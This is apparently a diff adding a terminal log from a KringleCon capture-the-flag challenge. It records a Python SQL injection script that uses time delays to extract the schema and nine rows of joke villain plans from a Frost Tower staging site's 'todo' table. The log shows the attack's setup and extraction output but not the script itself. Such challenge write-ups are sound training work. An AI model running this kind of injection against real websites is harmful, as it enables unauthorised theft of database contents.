@@ -1,0 +1,69 @@
+┌──(thedead㉿thinkali)-[~/Desktop/repos/Kringlecon4/12) Frost Tower Website Checkup]
+└─$ python2 frost_tower_SQLi.py 2>frost_tower_SQLi_stderr2.txt
+### Setup ###
+Base URL                 : https://staging.jackfrosttower.com/detail/PAYLOAD
+Base Query               : 1,QUERY_PAYLOAD
+Sleep Time               : 1
+### Run ###
+Table Schema encontact Table todo Columns [{'columnName': 'id', 'columnType': 'INT', 'isPK': True}, {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False}, {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False}]
+Table todo has 9 rows
+Table todo column id row #0 data has hex encoded length 1
+Table todo column {'columnName': 'id', 'columnType': 'INT', 'isPK': True} row#0 content is 1 [hex 1]
+Table todo column note row #0 data has hex encoded length 74
+Table todo column {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False} row#0 content is Buy up land all around Santa's Castle [hex 427579207570206c616e6420616c6c2061726f756e642053616e7461277320436173746c65]
+Table todo column completed row #0 data has hex encoded length 1
+Table todo column {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False} row#0 content is 1 [hex 1]
+Table todo row#0 has content [1, "Buy up land all around Santa's Castle", 1]
+Table todo column id row #1 data has hex encoded length 1
+Table todo column {'columnName': 'id', 'columnType': 'INT', 'isPK': True} row#1 content is 2 [hex 2]
+Table todo column note row #1 data has hex encoded length 104
+Table todo column {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False} row#1 content is Build bigger and more majestic tower next to Santa's [hex 4275696c642062696767657220616e64206d6f7265206d616a657374696320746f776572206e65787420746f2053616e74612773]
+Table todo column completed row #1 data has hex encoded length 1
+Table todo column {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False} row#1 content is 1 [hex 1]
+Table todo row#1 has content [2, "Build bigger and more majestic tower next to Santa's", 1]
+Table todo column id row #2 data has hex encoded length 1
+Table todo column {'columnName': 'id', 'columnType': 'INT', 'isPK': True} row#2 content is 3 [hex 3]
+Table todo column note row #2 data has hex encoded length 168
+Table todo column {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False} row#2 content is Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history [hex 45726f64652053616e7461277320696e666c75656e636520617420746865204e6f72746820506f6c65207669612046726f7374466573742c2074686520677265617465737420436f6e20696e20686973746f7279]
+Table todo column completed row #2 data has hex encoded length 1
+Table todo column {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False} row#2 content is 1 [hex 1]
+Table todo row#2 has content [3, "Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history", 1]
+Table todo column id row #3 data has hex encoded length 1
+Table todo column {'columnName': 'id', 'columnType': 'INT', 'isPK': True} row#3 content is 4 [hex 4]
+Table todo column note row #3 data has hex encoded length 122
+Table todo column {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False} row#3 content is Dishearten Santa's elves and encourage defection to our cause [hex 4469736865617274656e2053616e7461277320656c76657320616e6420656e636f757261676520646566656374696f6e20746f206f7572206361757365]
+Table todo column completed row #3 data has hex encoded length 1
+Table todo column {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False} row#3 content is 0 [hex 0]
+Table todo row#3 has content [4, "Dishearten Santa's elves and encourage defection to our cause", 0]
+Table todo column id row #4 data has hex encoded length 1
+Table todo column {'columnName': 'id', 'columnType': 'INT', 'isPK': True} row#4 content is 5 [hex 5]
+Table todo column note row #4 data has hex encoded length 200
+Table todo column {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False} row#4 content is Steal Santa's sleigh technology and build a competing and way better Frosty present delivery vehicle [hex 537465616c2053616e7461277320736c6569676820746563686e6f6c6f677920616e64206275696c64206120636f6d706574696e6720616e6420776179206265747465722046726f7374792070726573656e742064656c69766572792076656869636c65]
+Table todo column completed row #4 data has hex encoded length 1
+Table todo column {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False} row#4 content is 0 [hex 0]
+Table todo row#4 has content [5, "Steal Santa's sleigh technology and build a competing and way better Frosty present delivery vehicle", 0]
+Table todo column id row #5 data has hex encoded length 1
+Table todo column {'columnName': 'id', 'columnType': 'INT', 'isPK': True} row#5 content is 6 [hex 6]
+Table todo column note row #5 data has hex encoded length 248
+Table todo column {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False} row#5 content is Undermine Santa's ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem [hex 556e6465726d696e652053616e74612773206162696c69747920746f2064656c697665722070726573656e7473206f6e2031322f3234207468726f75676820656c662073746166662073686f7274616765732c20746563686e6f6c6f677920676c6974636865732c20616e64206173736f72746564206d617968656d]
+Table todo column completed row #5 data has hex encoded length 1
+Table todo column {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False} row#5 content is 0 [hex 0]
+Table todo row#5 has content [6, "Undermine Santa's ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem", 0]
+Table todo column id row #6 data has hex encoded length 1
+Table todo column {'columnName': 'id', 'columnType': 'INT', 'isPK': True} row#6 content is 7 [hex 7]
+Table todo column note row #6 data has hex encoded length 62
+Table todo column {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False} row#6 content is Force Santa to cancel Christmas [hex 466f7263652053616e746120746f2063616e63656c204368726973746d6173]
+Table todo column completed row #6 data has hex encoded length 1
+Table todo column {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False} row#6 content is 0 [hex 0]
+Table todo row#6 has content [7, 'Force Santa to cancel Christmas', 0]
+Table todo column {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False} row#7 content is SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide... so the whole world sees that Frost saved the Holiday Season!!!!  Bwahahahahaha! [hex 5341564520544845204441592062792064656c69766572696e672046726f7374792070726573656e7473207573696e67206d657263682066726f6d207468652046726f737420546f77657220476966742053686f7020746f206368696c6472656e20776f726c642d776964652e2e2e20736f207468652077686f6c6520776f726c64207365657320746861742046726f73742073617665642074686520486f6c6964617920536561736f6e2121212120204277616861686168616861686121]
+Table todo column completed row #7 data has hex encoded length 1
+Table todo column {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False} row#7 content is 0 [hex 0]
+Table todo row#7 has content [8, 'SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide... so the whole world sees that Frost saved the Holiday Season!!!!  Bwahahahahaha!', 0]
+Table todo column id row #8 data has hex encoded length 1
+Table todo column {'columnName': 'id', 'columnType': 'INT', 'isPK': True} row#8 content is 9 [hex 9]
+Table todo column note row #8 data has hex encoded length 226
+Table todo column {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False} row#8 content is With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him [hex 576974682053616e74612064656665617465642c206f6666657220746865206f6c64206d616e2061206a6f62206173206120636c65726b20696e207468652046726f737420546f77657220476966742053686f7020736f2077652063616e206b65657020616e20657965206f6e2068696d]
+Table todo column completed row #8 data has hex encoded length 1
+Table todo column {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False} row#8 content is 0 [hex 0]
+Table todo row#8 has content [9, 'With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him', 0]
